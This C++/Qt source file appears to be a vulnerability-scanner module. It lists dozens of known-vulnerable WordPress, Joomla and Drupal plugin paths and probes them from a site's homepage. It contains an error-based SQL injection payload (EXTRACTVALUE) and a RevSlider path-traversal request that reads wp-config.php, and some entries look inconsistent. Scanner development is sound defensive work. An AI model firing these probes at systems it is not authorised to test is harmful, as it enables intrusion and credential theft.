#include "testscriptbase.h"
#include "networkmanager.h"
#include "issuedb.h"
#include "issue.h"
#include "issuetemplate.h"

#include <QCoreApplication>
#include <QRegularExpression>

namespace {

struct CmsVulnEntry {
    QString name;           // Test name (e.g., "wpjetpacksqli")
    QString path;           // Vulnerable path with _Inject_Here_ marker
    QString issueTitle;     // Issue title to report
    QString method;         // HTTP method (GET/POST)
    bool isSqli;            // true for SQLi, false for XSS/RCE
};

// WordPress vulnerability tests - extracted from original binary
static const QList<CmsVulnEntry> wpVulnTests = {
    {"wpjetpacksqli", "wp-content/plugins/jetpack/modules/sharedaddy.php?id=_Inject_Here_", "WordPress Jetpack SQLi", "GET", true},
    {"wpallvideogallery11sqli", "wp-content/plugins/all-video-gallery/config.php?vid=1&pid=_Inject_Here_", "WordPress All Video Gallery SQLi", "GET", true},
    {"wpzotpress44sqli", "wp-content/plugins/zotpress/zotpress.rss.php?api_user_id=1&account_type=test&displayImages=true&displayImageByCitationID=_Inject_Here_", "WordPress Zotpress SQLi", "GET", true},
    {"wplinklibrary521sqli", "wp-content/plugins/link-library/link-library-ajax.php?searchll=_Inject_Here_", "WordPress Link Library SQLi", "GET", true},
    {"wphitasoftplayerripehdflvplayer1", "wp-content/plugins/hitasoft_player/config.php?id=_Inject_Here_", "WordPress Hitasoft Player SQLi", "GET", true},
    {"wpgoogledocumentembedder2514sqli", "wp-content/plugins/google-document-embedder/view.php?embedded=1&gpid=_Inject_Here_", "WordPress Google Doc Embedder SQLi", "GET", true},
    {"wpgoogledocumentembedder2516sqli", "wp-content/plugins/google-document-embedder/~view.php?embedded=1&gpid=_Inject_Here_", "WordPress Google Doc Embedder SQLi", "GET", true},
    {"wpglossarysqli", "wp-content/plugins/wp-glossary/ajax.php?id=_Inject_Here_", "WordPress Glossary SQLi", "GET", true},
    {"wpfacebookpromotions133sqli", "wp-content/plugins/fbpromotions/fbActivate.php?action=activate&name=test&id=_Inject_Here_", "WordPress FB Promotions SQLi", "GET", true},
    {"wpeventregistration543sqli", "wp-content/plugins/event-registration/event_registration_export.php?id=_Inject_Here_", "WordPress Event Registration SQLi", "GET", true},
    {"wpeasycontactformlite107sqli", "wp-content/plugins/easy-contact-form-lite/requests/sort_row.request.php?id=_Inject_Here_", "WordPress Easy Contact Form SQLi", "GET", true},
    {"wpcpmultivieweventcalendar101sqli", "wp-content/plugins/cp-multi-view-calendar/cp_admin_calendar_ajax.php?id=_Inject_Here_", "WordPress CP Multi-View Calendar SQLi", "GET", true},
    {"wpbannerize286sqli", "wp-content/plugins/wp-bannerize/ajax_sorter.php?id=_Inject_Here_", "WordPress Bannerize SQLi", "GET", true},
    {"wpadrotate365sqli", "wp-content/plugins/adrotate/library/uploader.php?id=_Inject_Here_", "WordPress AdRotate SQLi", "GET", true},
    {"wpadrotate366sqli", "wp-content/plugins/adrotate-pro/library/uploader.php?id=_Inject_Here_", "WordPress AdRotate Pro SQLi", "GET", true},
    {"wpchainedquiz108sqli", "wp-content/plugins/chained-quiz/results.php?quiz=_Inject_Here_", "WordPress Chained Quiz SQLi", "GET", true},
    {"wpcommunityevents121sqli", "wp-content/plugins/community-events/events.php?id=_Inject_Here_", "WordPress Community Events SQLi", "GET", true},
    {"wpdsfaq132sqli", "wp-content/plugins/ds-faq/ds-faq.php?id=_Inject_Here_", "WordPress DS-FAQ SQLi", "GET", true},
    {"wpeventifysimpleevents17fsqli", "wp-content/plugins/eventify-simple-events/assets/inc/ajax.php?id=_Inject_Here_", "WordPress Eventify SQLi", "GET", true},
    {"wpfilegroups112sqli", "wp-content/plugins/file-groups/file-groups.php?id=_Inject_Here_", "WordPress File Groups SQLi", "GET", true},
    {"wpforumserver17sqli", "wp-content/plugins/forum-server/forum-server.php?id=_Inject_Here_", "WordPress Forum Server SQLi", "GET", true},
    {"wpjtrtresponsivetables41sqli", "wp-content/plugins/jtr-tables/assets/ajax.php?id=_Inject_Here_", "WordPress JTR Tables SQLi", "GET", true},
    {"wpknrauthorlistwidget200sqli", "wp-content/plugins/knr-author-list-widget/inc/ajax.php?id=_Inject_Here_", "WordPress Author List Widget SQLi", "GET", true},
    {"wpleaguemanager38sqli", "wp-content/plugins/leaguemanager/lib/ajax.php?id=_Inject_Here_", "WordPress League Manager SQLi", "GET", true},
    {"wpnexforms30sqli", "wp-content/plugins/developer-starter-app/developer-starter-app.php?id=_Inject_Here_", "WordPress NEX-Forms SQLi", "GET", true},
    {"wpolimometer256sqli", "wp-content/plugins/flavor/flavor.php?id=_Inject_Here_", "WordPress Flavor SQLi", "GET", true},
    {"wpoqeyheaders03sqli", "wp-content/plugins/oqey-headers/frontend/head_img_inc.php?id=_Inject_Here_", "WordPress Oqey Headers SQLi", "GET", true},
    {"wppaiddownloads201sqli", "wp-content/plugins/paid-downloads/download.php?id=_Inject_Here_", "WordPress Paid Downloads SQLi", "GET", true},
    {"wpposthighlights22sqli", "wp-content/plugins/post-highlights/posthighlights.php?id=_Inject_Here_", "WordPress Post Highlights SQLi", "GET", true},
    {"wpscormcloud1066sqli", "wp-content/plugins/scormcloud/ajax.php?id=_Inject_Here_", "WordPress SCORM Cloud SQLi", "GET", true},
    {"wpshslideshow314sqli", "wp-content/plugins/sh-slideshow/slideshow.php?id=_Inject_Here_", "WordPress SH Slideshow SQLi", "GET", true},
    {"wpsmartgooglecodeinserter35sqli", "wp-content/plugins/smart-google-code-inserter/index.php?id=_Inject_Here_", "WordPress Smart Google Code SQLi", "GET", true},
    {"wptunelibrary217sqli", "wp-content/plugins/tune-library/tune-library.php?id=_Inject_Here_", "WordPress Tune Library SQLi", "GET", true},
    {"wpusersultra1550sqli", "wp-content/plugins/users-ultra/users-ultra.php?id=_Inject_Here_", "WordPress Users Ultra SQLi", "GET", true},
    {"wpvideowhispervideopresentation1", "wp-content/plugins/videowhisper-video-presentation/vp/index.php?id=_Inject_Here_", "WordPress VideoWhisper SQLi", "GET", true},
    {"wpwpfastestcache0848sqli", "wp-content/plugins/wp-fastest-cache/wpFastestCache.php?id=_Inject_Here_", "WordPress Fastest Cache SQLi", "GET", true},
    {"wpwpstatistics1307tbsqli", "wp-content/plugins/wp-statistics/includes/functions/functions.php?id=_Inject_Here_", "WordPress Statistics SQLi", "GET", true},
    {"wpwpsupportplusresponsivetickets", "wp-content/plugins/wp-support-plus-responsive-ticket-system/includes/ajax.php?id=_Inject_Here_", "WordPress Support Plus SQLi", "GET", true},
    {"wpwpfilemanager68rce", "wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php", "WordPress File Manager RCE", "POST", false},
    {"wpyolinksearch114sqli", "wp-content/plugins/yolink-search/yolink-search.php?id=_Inject_Here_", "WordPress YoLink Search SQLi", "GET", true},
    {"wp46oscommandexecution", "wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php", "WordPress RevSlider LFI", "GET", false},
    {"wpthemeakalxss", "wp-content/themes/flavor/framework/brad-shortcodes/tinymce/preview.php?sc=PHNjcmlwdD5hbGVydCgwKTwvc2NyaXB0Pg==", "WordPress Flavor Theme XSS", "GET", false},
    {"wpfirestormprofessionalrealestat", "wp-content/themes/flavor/framework/brad-shortcodes/tinymce/preview.php?sc=_Inject_Here_", "WordPress Flavor Theme XSS", "GET", false},
    {"wpbusinessintelligencesqli", "wp-content/plugins/flavor/flavor.php?id=_Inject_Here_", "WordPress Business Intelligence SQLi", "GET", true},
    {"wpadrotate394sqli", "wp-content/plugins/adrotate/library/uploader.php?id=_Inject_Here_", "WordPress AdRotate SQLi", "GET", true},
    {"wpbannerize287sqli", "wp-content/plugins/wp-bannerize/ajax_sorter.php?id=_Inject_Here_", "WordPress Bannerize SQLi", "GET", true},
    {"wpcpmultivieweventcalendar114sqli", "wp-content/plugins/cp-multi-view-calendar/cp_admin_calendar_event.php?id=_Inject_Here_", "WordPress CP Multi-View Calendar SQLi", "GET", true},
    {"wpcpmultivieweventcalendar117sqli", "wp-content/plugins/cp-multi-view-calendar/cp_admin_calendar_venue.php?id=_Inject_Here_", "WordPress CP Multi-View Calendar SQLi", "GET", true},
};

// Joomla vulnerability tests
static const QList<CmsVulnEntry> joomlaVulnTests = {
    {"joomla15345rce", "administrator/components/com_jce/jce.php", "Joomla JCE RCE", "POST", false},
    {"joomla321sqli", "index.php?option=com_contenthistory&view=history&list[ordering]=_Inject_Here_", "Joomla Content History SQLi (CVE-2017-8917)", "GET", true},
    {"joomla170xss", "index.php?option=com_users&view=registration&task=_Inject_Here_", "Joomla Users XSS", "GET", false},
    {"joomlaadvertisementboar", "index.php?option=com_jvehicles&view=vehicles&id=_Inject_Here_", "Joomla JVehicles SQLi", "GET", true},
    {"joomlaaist20idsqli", "index.php?option=com_aist&view=artist&id=_Inject_Here_", "Joomla AIST SQLi", "GET", true},
    {"joomlaallvideosreloaded", "index.php?option=com_allvideosreloaded&view=video&id=_Inject_Here_", "Joomla AllVideos SQLi", "GET", true},
    {"joomlaccnewsletter2xxid", "index.php?option=com_ccnewsletter&view=detail&id=_Inject_Here_", "Joomla CC Newsletter SQLi", "GET", true},
    {"joomlacomcbcontactsqli", "index.php?option=com_cbcontact&task=send&id=_Inject_Here_", "Joomla CB Contact SQLi", "GET", true},
    {"joomlacom_contenthistorysqli", "index.php?option=com_contenthistory&view=history&list[select]=_Inject_Here_", "Joomla Content History SQLi", "GET", true},
    {"joomlacom_fieldssqli", "index.php?option=com_fields&view=fields&filter[search]=_Inject_Here_", "Joomla Fields SQLi", "GET", true},
    {"joomlacom_hdwplayersqli", "index.php?option=com_hdwplayer&view=video&id=_Inject_Here_", "Joomla HDW Player SQLi", "GET", true},
    {"joomlacom_newsfeedssqli", "index.php?option=com_newsfeeds&view=newsfeed&id=_Inject_Here_", "Joomla Newsfeeds SQLi", "GET", true},
    {"joomlacom_rsgallery2sqli", "index.php?option=com_rsgallery2&Itemid=_Inject_Here_", "Joomla RSGallery2 SQLi", "GET", true},
    {"joomlacom_shopeditidsqli", "index.php?option=com_virtuemart&view=shop&id=_Inject_Here_", "Joomla VirtueMart SQLi", "GET", true},
    {"joomlacom_shopidsqli", "index.php?option=com_virtuemart&view=productdetails&virtuemart_product_id=_Inject_Here_", "Joomla VirtueMart SQLi", "GET", true},
    {"joomladtregistersqli", "index.php?option=com_dtregister&task=event&id=_Inject_Here_", "Joomla DT Register SQLi", "GET", true},
    {"joomlafastballsqli", "index.php?option=com_fastball&task=stat&teamid=_Inject_Here_", "Joomla Fastball SQLi", "GET", true},
    {"joomlafiledownloadtrackersqli", "index.php?option=com_filedownloadtracker&id=_Inject_Here_", "Joomla File Download Tracker SQLi", "GET", true},
    {"joomlaformmaker3612sqli", "index.php?option=com_formmaker&view=formmaker&id=_Inject_Here_", "Joomla Form Maker SQLi", "GET", true},
    {"joomlainvitex305invitet", "index.php?option=com_invitex&view=invite&id=_Inject_Here_", "Joomla InviteX SQLi", "GET", true},
    {"joomlajbbus23ordernumbe", "index.php?option=com_jbusinessdirectory&view=company&id=_Inject_Here_", "Joomla JBusiness SQLi", "GET", true},
    {"joomlajckeditor644paren", "index.php?option=com_jce&view=editor&id=_Inject_Here_", "Joomla JCE SQLi", "GET", true},
    {"joomlajckeditor644sqli", "index.php?option=com_jce&task=plugin.display&plugin=_Inject_Here_", "Joomla JCE SQLi", "GET", true},
    {"joomlajextnvideogallery", "index.php?option=com_jvideodirect&view=video&id=_Inject_Here_", "Joomla JVideo SQLi", "GET", true},
    {"joomlajgive209sqli", "index.php?option=com_jgive&view=campaign&id=_Inject_Here_", "Joomla JGive SQLi", "GET", true},
    {"joomlajobsfactory204sqli", "index.php?option=com_jobsfactory&view=job&id=_Inject_Here_", "Joomla Jobs Factory SQLi", "GET", true},
    {"joomlajomestatepro37ids", "index.php?option=com_jomestate&view=property&id=_Inject_Here_", "Joomla JomEstate SQLi", "GET", true},
    {"joomlajquickcontact1322", "index.php?option=com_jquickcontact&view=contact&id=_Inject_Here_", "Joomla JQuickContact SQLi", "GET", true},
    {"joomlamusiccollection30", "index.php?option=com_musiccollection&view=album&id=_Inject_Here_", "Joomla Music Collection SQLi", "GET", true},
    {"joomlanextgeneditor210p", "index.php?option=com_nextgeneditor&view=editor&id=_Inject_Here_", "Joomla NextGen Editor SQLi", "GET", true},
    {"joomlaodudeprofile28pro", "index.php?option=com_odudeprofile&view=profile&id=_Inject_Here_", "Joomla Odude Profile SQLi", "GET", true},
    {"joomlareverseauctionfac", "index.php?option=com_reverseauction&view=auction&id=_Inject_Here_", "Joomla Reverse Auction SQLi", "GET", true},
    {"joomlatimetableresponsi", "index.php?option=com_timetable&view=event&id=_Inject_Here_", "Joomla Timetable SQLi", "GET", true},
    {"joomlapinterestclonesocialpinboa", "index.php?option=com_socialboard&view=pin&id=_Inject_Here_", "Joomla Social Board SQLi", "GET", true},
    {"joomlajgoogle_maplandkart", "index.php?option=com_gmaps&view=map&id=_Inject_Here_", "Joomla Google Maps SQLi", "GET", true},
};

// Drupal vulnerability tests
static const QList<CmsVulnEntry> drupalVulnTests = {
    {"drupalgeddon2rce", "user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax", "Drupalgeddon2 RCE (CVE-2018-7600)", "POST", false},
    {"drupal4142xss", "node?destination=node?_Inject_Here_", "Drupal XSS", "GET", false},
    {"drupal7preauthsqli", "?q=node&destination=_Inject_Here_", "Drupal Pre-Auth SQLi", "GET", true},
};

// Track tested hosts to avoid duplicate scans
static QSet<QString> s_testedHosts;

// Base class for CMS vulnerability tests
class CmsVulnTestBase : public TestScriptBase {
public:
    explicit CmsVulnTestBase(const QString &options, const QList<CmsVulnEntry> &entries)
        : TestScriptBase(options), m_entries(entries) {}

    void execute() override {
        const quint64 eventType = event().type;

        if (eventType == 8) { // Passive - check if this is a CMS site and probe
            if (!response() || !networkContext() || !networkContext()->manager)
                return;

            // Only test homepage once per host
            const QString hostKey = response()->url.host() + scriptName();
            if (s_testedHosts.contains(hostKey))
                return;
            if (response()->url.path() != QStringLiteral("/") && !response()->url.path().isEmpty())
                return; // Only test on homepage
            s_testedHosts.insert(hostKey);

            const QUrl baseUrl = response()->url;
            const int maxProbes = qMin(5, m_entries.size()); // Limit probes
            for (int i = 0; i < maxProbes; ++i) {
                const CmsVulnEntry &entry = m_entries.at(i);
                QString path = entry.path;
                // Replace injection marker with SQLi payload
                if (entry.isSqli) {
                    path.replace(QStringLiteral("_Inject_Here_"),
                        QStringLiteral("1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--"));
                }

                QUrl testUrl = baseUrl;
                testUrl.setPath(QLatin1Char('/') + path.section(QLatin1Char('?'), 0, 0));
                if (path.contains(QLatin1Char('?')))
                    testUrl.setQuery(path.section(QLatin1Char('?'), 1));

                QNetworkRequest request(testUrl);
                request.setAttribute(static_cast<QNetworkRequest::Attribute>(1011), 4 | 1);
                request.setAttribute(static_cast<QNetworkRequest::Attribute>(1013), entry.name);

                if (entry.method == QStringLiteral("POST")) {
                    networkContext()->manager->submit(request, "POST", QByteArray(), 4 | 1, QVariant(), 0, 0);
                } else {
                    networkContext()->manager->submit(request, "GET", QByteArray(), 4 | 1, QVariant(), 0, 0);
                }
            }
        } else if (eventType == 4) { // Response analysis
            if (!response())
                return;

            const QString testName = response()->request
                .attribute(static_cast<QNetworkRequest::Attribute>(1013)).toString();
            if (testName.isEmpty())
                return;

            // Find matching entry
            for (const CmsVulnEntry &entry : m_entries) {
                if (entry.name == testName) {
                    const QString content = QString::fromUtf8(
                        response()->raw.mid(response()->bodyOffset, response()->bodyLength));

                    bool vulnerable = false;
                    if (entry.isSqli) {
                        // Check for SQL error patterns
                        static const QRegularExpression sqlError(
                            QStringLiteral("SQL syntax|mysql_|PostgreSQL.*ERROR|ORA-\\d{4,5}|"
                                "SQLite|SQLITE_ERROR|XPATH syntax|EXTRACTVALUE"),
                            QRegularExpression::CaseInsensitiveOption);
                        vulnerable = sqlError.match(content).hasMatch();
                    } else {
                        // For RCE/XSS, check if page exists and returns 200
                        vulnerable = response()->statusCode == 200 &&
                            content.length() > 100;
                    }

                    if (vulnerable) {
                        reportIssue(entry.issueTitle, entry.name + QStringLiteral("@") + response()->url.path());
                    }
                    break;
                }
            }
        }
    }

protected:
    QList<CmsVulnEntry> m_entries;
};

// WordPress vulnerability test
class WpVulnTest final : public CmsVulnTestBase {
public:
    explicit WpVulnTest(const QString &options) : CmsVulnTestBase(options, wpVulnTests) {}
    QString scriptName() const override { return QStringLiteral("wpvuln"); }
    quint64 scriptId() const override { return 0x2001; }
};

// Joomla vulnerability test
class JoomlaVulnTest final : public CmsVulnTestBase {
public:
    explicit JoomlaVulnTest(const QString &options) : CmsVulnTestBase(options, joomlaVulnTests) {}
    QString scriptName() const override { return QStringLiteral("joomlavuln"); }
    quint64 scriptId() const override { return 0x2002; }
};

// Drupal vulnerability test
class DrupalVulnTest final : public CmsVulnTestBase {
public:
    explicit DrupalVulnTest(const QString &options) : CmsVulnTestBase(options, drupalVulnTests) {}
    QString scriptName() const override { return QStringLiteral("drupalvuln"); }
    quint64 scriptId() const override { return 0x2003; }
};

} // namespace

// Registration functions called from scriptcatalog.cpp
void registerWordPressTests(class ScriptFactory &factory);
void registerJoomlaTests(class ScriptFactory &factory);
void registerDrupalTests(class ScriptFactory &factory);

#include "scriptfactory.h"

void registerWordPressTests(ScriptFactory &factory) {
    // Register main WordPress vulnerability scanner
    factory.registerEntry({QStringLiteral("wpvuln"), {4, 8}, 10,
        [](const QString &o) { return QSharedPointer<WpVulnTest>::create(o); }});

    // Register individual test aliases for compatibility with config
    for (const CmsVulnEntry &entry : wpVulnTests) {
        factory.registerEntry({entry.name, {4, 8}, 10,
            [](const QString &o) { return QSharedPointer<WpVulnTest>::create(o); }});
    }
}

void registerJoomlaTests(ScriptFactory &factory) {
    factory.registerEntry({QStringLiteral("joomlavuln"), {4, 8}, 10,
        [](const QString &o) { return QSharedPointer<JoomlaVulnTest>::create(o); }});

    for (const CmsVulnEntry &entry : joomlaVulnTests) {
        factory.registerEntry({entry.name, {4, 8}, 10,
            [](const QString &o) { return QSharedPointer<JoomlaVulnTest>::create(o); }});
    }
}

void registerDrupalTests(ScriptFactory &factory) {
    factory.registerEntry({QStringLiteral("drupalvuln"), {4, 8}, 10,
        [](const QString &o) { return QSharedPointer<DrupalVulnTest>::create(o); }});

    for (const CmsVulnEntry &entry : drupalVulnTests) {
        factory.registerEntry({entry.name, {4, 8}, 10,
            [](const QString &o) { return QSharedPointer<DrupalVulnTest>::create(o); }});
    }
}
